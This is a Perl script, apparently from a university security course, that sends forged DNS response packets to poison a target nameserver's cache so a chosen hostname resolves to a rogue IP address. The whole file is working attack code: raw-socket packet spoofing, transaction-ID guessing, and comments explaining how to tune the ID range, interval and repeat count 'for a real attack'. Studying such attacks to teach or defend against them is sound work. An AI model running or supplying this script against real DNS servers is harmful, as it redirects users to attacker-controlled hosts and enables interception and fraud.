#!/usr/bin/env perl
## dns_fake_response.pl
## Avi Kak
## March 27, 2011
## Call syntax: sudo dns_fake_response.pl
## Shows you how you can put on the wire UDP packets that could
## potentially be a response to a DNS query emanating from a client name
## resolver or a DNS caching nameserver. This script repeatedly sends out
## UDP packets, each packet with a different DNS transaction ID. The DNS Address
## Record (meaning a Resource Record of type A) contained in the data payload
## of every UDP packet is the same --- the fake IP address for a domain.
## This script must be executed as root as it seeks to construct a socket of

use Net::DNS;
use Net::RawIP;
use strict;
use warnings;
my $sourceIP = ’10.0.0.3’; # IP address of the attacking host #(A)
my $destIP = ’10.0.0.8’; # IP address of the victim DNS server #(B)
# (If victim dns server is in your LAN, this
# must be a valid IP in your LAN since otherwise
# ARP would not be able to get a valid MAC address
# and the UDP datagram would have nowhere to go)
my $destPort = 53; # usual DNS port #(C)
my $sourcePort = 5353; #(D)
# Transaction IDs to use:
my @spoofing_set = 34000..34001; # Make it to be a large and apporpriate #(E)
# range for a real attack
my $victim_hostname="moonshine.ecn.purdue.edu"; #(F)
# The name of the host whose IP
# address you want to corrupt with a
# rogue IP address in the cache of
# the targeted DNS server (in line
# (B) above)
my $rogueIP=’10.0.0.25’; # This is the face IP for the victim hostname #(G)
my @udp_packets; # This will be a collection of DNS response packets #(H)
# with each packet using a different transaction ID
foreach my $dns_trans_id (@spoofing_set) { #(I)
my $udp_packet = new Net::RawIP({ip=> {saddr=>$sourceIP, daddr=>$destIP}, #(J)
udp=>{source=>$sourcePort, dest=>$destPort}}); #(K)
# Prepare DNS fake reponse data for the UDP packet:
my $dns_packet = Net::DNS::Packet->new($victim_hostname, "A", "IN"); #(L)
$dns_packet->header->qr(1); # for a DNS reponse packet #(M)
print "constructing dns packet for id: $dns_trans_id\n";
$dns_packet->header->id($dns_trans_id); #(N)
$dns_packet->print;
$dns_packet->push("pre", rr_add($victim_hostname . ". 86400 A " . $rogueIP)); #(O)
my $udp_data = $dns_packet->data; #(P)


# Insert fake DNS data into the UDP packet:
$udp_packet->set({udp=>{data=>$udp_data}}); #(Q)
push @udp_packets, $udp_packet; #(R)
}
my $interval = 1; # for the number of seconds between successive #(S)


# transmissions of the UDP reponse packets.
# Make it 0.001 for a real attack. The value of 1
# is good for dubugging.
my $repeats = 2; # Give it a large value for a real attack #(T)
my $attempt = 0; #(U)
while ($attempt++ < $repeats) { #(V)
foreach my $udp_packet (@udp_packets) { #(W)
$udp_packet->send(); #(X)
sleep $interval; #(Y)
}
}
